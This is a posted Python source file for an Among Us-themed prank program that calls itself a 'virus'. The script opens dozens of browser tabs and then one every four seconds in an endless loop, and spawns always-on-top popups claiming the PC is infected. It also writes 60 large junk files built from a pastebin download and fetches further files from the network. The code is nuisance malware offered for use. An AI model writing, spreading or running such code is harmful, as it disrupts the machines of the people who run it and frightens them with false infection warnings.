# here's the source code

```python
#import stuff

import threading
from tkinter import *  
import webbrowser
import time
import requests
import random


#start the program >:)



#define pop ups

def popUp():

    
    #defines and sets up guis settings
    root = Tk()
    root.title('AMONGUS POPIT')
    root.geometry('500x40')
    root.minsize(500, 40)
    root.maxsize(500, 40)
    root.attributes('-topmost', True)

    #function that kills gui
    def kill():
        root.destroy()

    response = requests.get("https://d19bjv63x2j8ah.cloudfront.net/v2/54432/contents/J9UJ7Ww049VlToG8/amogus__2_.ico")


    #sets up icon for gui
    file = open("amogus.ico", "wb")
    file.write(response.content)
    file.close()

    root.iconbitmap("amogus.ico")

    #sets up the randomly selected text for pop ups
    shitpos = ['AMONGUS OMG OMG MANGNUS SDF ASADSADS', 'WHEN THE IMPOSTER IS SUSSSSSSS',  'your computer is amogus', 'AMONGUS YES SUSSY SUSsY BAKA', 'GUYS THAT ONE MOMENT WHEN THE IMPSTER IS SUSSY BAKA OMG OMG OMMG GMOMSDDSFIJDFSIJNFDSIJNFDJNFDBHJNKLSHJBKLFDBHJKNLDFSBHJKDFSBHDFSHJBK', 'WOWIE AMONGUS UsUUSUASDASSADjakdsjnkasdjknsad', 'youre pc is infectede and is sussy', 'sussy pc', 'lol check your files idiot', 'AMONGUS CREWMATE OMGGGGGGGGGGG HES SUSsus', 'why did you install this', 'this program kinda sus ngl']

    #labels and stuf
    labe = Label(root, text = random.choice(shitpos))
    labe.pack()


    butt = Button(root, text="Ok", command = kill,)
    butt.pack()



    root.mainloop()


#Threads pop ups sp they don't stop the program

popthreading = threading.Thread(target = popUp)
popthreading1 = threading.Thread(target = popUp)
popthreading2 = threading.Thread(target = popUp)
popthreading3 = threading.Thread(target = popUp)
popthreading4 = threading.Thread(target = popUp)
popthreading5 = threading.Thread(target = popUp)
popthreading6 = threading.Thread(target = popUp)
popthreading7 = threading.Thread(target = popUp)
popthreading8 = threading.Thread(target = popUp)
popthreading9 = threading.Thread(target = popUp)
popthreading10 = threading.Thread(target = popUp)
popthreading11 = threading.Thread(target = popUp)





time.sleep(.2)

#begin virus

webbrowser.open('https://www.youtube.com/watch?v=5DlROhT8NgU')

time.sleep(1)

webbrowser.open('https://www.youtube.com/watch?v=obmlZH3X9gs')

time.sleep(1.8)

webbrowser.open('https://www.youtube.com/watch?v=5SjEVperZJg')

time.sleep(1.8)






#defines th spam amogus tabs function

def spamTabs(var):
    shitpost = ['https://www.youtube.com/watch?v=grd-K33tOSM', 'https://www.youtube.com/watch?v=5DlROhT8NgU', 'https://www.youtube.com/watch?v=5SjEVperZJg', 'https://227263-694567-raikfcquaxqncofqfm.stackpathdns.com/wp-content/uploads/2020/12/Among-Us-Red-Crewmate.png', 'https://www.youtube.com/watch?v=0bZ0hkiIKt0&t=13s', 'https://pbs.twimg.com/profile_images/1364920241265012743/Y__158zv_400x400.png', 'https://www.amazon.com/hgerGWW-Bubbles-Fidget-Stress-Relieving/dp/B098XQYZFS/ref=asc_df_B098XQYZFS/?tag=hyprod-20&linkCode=df0&hvadid=533172658696&hvpos=&hvnetw=g&hvrand=6786061071917065198&hvpone=&hvptwo=&hvqmt=&hvdev=c&hvdvcmdl=&hvlocint=&hvlocphy=1018155&hvtargid=pla-1395386521871&th=1']
    x = var
    while x >= 1:
        webbrowser.open(random.choice(shitpost))
        x -= 1



#spams first round of tabs

spamTabs(10)

time.sleep(2)


#Starts first pop ups

popthreading.start()


#spam secind round of tabs

time.sleep(3)
spamTabs(20)


#spams the big file so that this program isn't too big

data = requests.get('https://pastebin.com/raw/YD35VyNB')


#spams files

x = 60

while x >= 1:
    fh = open('AMOGUS.AMOGUS' + str(x), 'w')
    fh.write(str(data.text + data.text + data.text))
    fh.close()
    x -= 1

popthreading1.start()


#spam third round of tabs

time.sleep(1)
spamTabs(30)

#two waves of pop ups because idk what to do anymore

popthreading2.start()
popthreading3.start()
popthreading4.start()
popthreading5.start()
popthreading6.start()
popthreading7.start()
popthreading8.start()
popthreading9.start()



time.sleep(2)


#Ending with final wave of spam tabs

spamTabs(30)

serch = ["MOGUS", "amogus hot", "amogus hot fnf", "amogus at five am", "amogus super hot", "amogus roblox free robuxs obee", "free amonggus pop iiy free"]

#spams other browser
q = 20
while q >= 1:
    webbrowser.open(random.choice(serch))
    q -= 1


#open a bunch of amongud images

response = requests.get("https://play-lh.googleusercontent.com/8ddL1kuoNUB5vUvgDVjYY3_6HwQcrg1K2fd_R8soD-e2QYj8fT9cfhfh3G0hnSruLKec")

f = open("among-us.jpeg", "wb")
f.write(response.content)
f.close()

response = requests.get("https://227263-694567-raikfcquaxqncofqfm.stackpathdns.com/wp-content/uploads/2020/12/Among-Us-Red-Crewmate.png")

f = open("sussy.png", "wb")
f.write(response.content)
f.close()

response = requests.get("https://www.queensjournal.ca/sites/default/files/img/story/2020/10/01/among_us.png")

f = open("sussymogus.png", "wb")
f.write(response.content)
f.close()

response = requests.get("https://wompampsupport.azureedge.net/fetchimage?siteId=7575&v=2&jpgQuality=100&width=700&url=https%3A%2F%2Fi.kym-cdn.com%2Fentries%2Ficons%2Foriginal%2F000%2F036%2F482%2Fcover5.jpg")

f = open("amongggs.jpeg", "wb")
f.write(response.content)
f.close()

response = requests.get("https://static.wikia.nocookie.net/the-streets-roblox/images/9/9e/Amogus.jpg/revision/latest?cb=20210409100921")

f = open("sussybaka.jpeg", "wb")
f.write(response.content)
f.close()


#do a bunch of other stuff
q = 20
while q >= 1:
    webbrowser.open(random.choice(serch))
    q -= 1

time.sleep(1)


shitpost = ['https://www.youtube.com/watch?v=grd-K33tOSM', 'https://www.youtube.com/watch?v=5DlROhT8NgU', 'https://www.youtube.com/watch?v=5SjEVperZJg', 'https://227263-694567-raikfcquaxqncofqfm.stackpathdns.com/wp-content/uploads/2020/12/Among-Us-Red-Crewmate.png', 'https://www.youtube.com/watch?v=0bZ0hkiIKt0&t=13s', 'https://pbs.twimg.com/profile_images/1364920241265012743/Y__158zv_400x400.png', 'https://www.amazon.com/hgerGWW-Bubbles-Fidget-Stress-Relieving/dp/B098XQYZFS/ref=asc_df_B098XQYZFS/?tag=hyprod-20&linkCode=df0&hvadid=533172658696&hvpos=&hvnetw=g&hvrand=6786061071917065198&hvpone=&hvptwo=&hvqmt=&hvdev=c&hvdvcmdl=&hvlocint=&hvlocphy=1018155&hvtargid=pla-1395386521871&th=1']
x = 20
while x >= 1:
    
    webbrowser.open(random.choice(shitpost))
    x -= 1

q = 40
while q >= 1:
    webbrowser.open(random.choice(serch))
    q -= 1

#Downloads website

response = requests.get('https://pastebin.com/raw/c6rHCKmu')

f = open('AMOGUSQUIZ.html', 'w')
f.write(str(response.text))
f.close


while True:
    
    webbrowser.open(random.choice(shitpost))
    time.sleep(4)
```

